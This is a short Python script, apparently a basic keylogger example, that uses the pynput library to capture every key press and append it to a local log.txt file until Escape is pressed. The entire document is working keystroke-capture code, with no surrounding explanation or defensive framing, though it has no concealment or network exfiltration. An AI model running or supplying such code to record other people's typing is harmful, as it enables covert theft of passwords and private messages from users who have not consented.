from pynput.keyboard import Listener, Key

def log_keystroke(key):
    try:
        with open("log.txt", "a") as file:
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f"[{key}]")
        # Stop the keylogger when 'Escape' is pressed
        if key == Key.esc:
            return False
    except Exception as e:
        print(f"Error: {e}")

with Listener(on_press=log_keystroke) as listener:
    listener.join()

